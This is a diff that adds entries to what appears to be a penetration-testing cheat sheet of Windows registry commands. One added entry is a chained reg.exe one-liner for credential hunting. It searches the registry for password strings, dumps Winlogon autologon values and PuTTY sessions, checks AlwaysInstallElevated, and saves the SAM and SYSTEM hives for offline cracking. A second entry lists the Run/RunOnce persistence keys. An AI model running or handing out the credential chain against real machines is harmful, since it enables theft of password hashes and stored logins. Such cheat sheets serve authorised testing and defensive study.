@@ -4,6 +4,28 @@
 <!-- tags: windows,registry,reg,powershell -->
 <!-- platform: windows -->
 
+> **Chain entries** bundle registry sequences for credential hunt + persistence survey. `&` is cmd.exe sequencer; `2>nul` suppresses "key not found" noise so you only see hits.
+
+## registry chain credential hunt
+Password string sweep (HKLM) → winlogon autologon dump → PuTTY saved sessions → AlwaysInstallElevated check → SAM + SYSTEM hive save for offline cracking. SAM/SYSTEM save requires admin — fails loudly, doesn't block the rest.
+
+```bash
+reg query HKLM /f "password" /t REG_SZ /s 2>nul & reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul & reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>nul & reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2>nul & reg save HKLM\SAM C:\Windows\Temp\sam.hiv /y 2>nul & reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv /y 2>nul
+```
+
+<!-- meta: risk=high | phase=credaccess | tags=registry,chain,credentials,winlogon,putty,sam,hive -->
+
+---
+
+## registry chain persistence survey
+Dump every Run / RunOnce key across HKLM + HKCU — the four most-abused persistence locations in one call.
+
+```bash
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" 2>nul & reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 2>nul & reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" 2>nul & reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" 2>nul
+```
+
+<!-- meta: risk=low | phase=enum | tags=registry,chain,persistence,run,runonce,survey -->
+
 ## query registry key reg
 Dump a key's values with reg.exe (cmd-friendly, works everywhere).
 
